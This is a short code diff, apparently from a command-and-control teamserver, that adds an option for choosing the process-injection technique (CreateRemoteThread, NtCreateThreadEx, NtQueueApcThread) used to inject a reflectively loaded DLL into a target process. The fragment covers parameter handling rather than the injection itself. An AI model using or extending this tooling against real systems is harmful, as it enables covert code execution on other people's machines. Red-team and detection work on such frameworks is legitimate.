@@ -830,10 +830,33 @@ func (a *Agent) TaskPrepare(Command int, Info any, Message *map[string]string, C
 			binaryDecoded, _     = base64.StdEncoding.DecodeString(Optional["Binary"].(string))
 			TargetPID, _         = strconv.Atoi(Optional["PID"].(string))
 			Param, _             = Optional["Arguments"].(string)
-			InjectMethode        int
+			Technique            = THREAD_METHOD_DEFAULT
 			DllReflectiveLdr     []byte
 			DllReflectiveLdrPath string
 		)
+
+		if val, ok := Optional["Technique"]; ok {
+			switch strings.ToLower(val.(string)) {
+			case "default":
+				Technique = THREAD_METHOD_DEFAULT
+				break
+
+			case "createremotethread":
+				Technique = THREAD_METHOD_CREATEREMOTETHREAD
+				break
+
+			case "ntcreatethreadex":
+				Technique = THREAD_METHOD_NTCREATEHREADEX
+				break
+
+			case "ntqueueapcthread":
+				Technique = THREAD_METHOD_NTQUEUEAPCTHREAD
+				break
+
+			default:
+				return job, fmt.Errorf("technique \"%v\"", val.(string))
+			}
+		}
 
 		DllReflectiveLdrPath = utils.GetTeamserverPath() + "/payloads/DllLdr.x64.bin"
 
@@ -843,7 +866,7 @@ func (a *Agent) TaskPrepare(Command int, Info any, Message *map[string]string, C
 		}
 
 		job.Data = []interface{}{
-			InjectMethode, // Injection technique syscall
+			Technique,
 			TargetPID,
 			DllReflectiveLdr,
 			binaryDecoded,
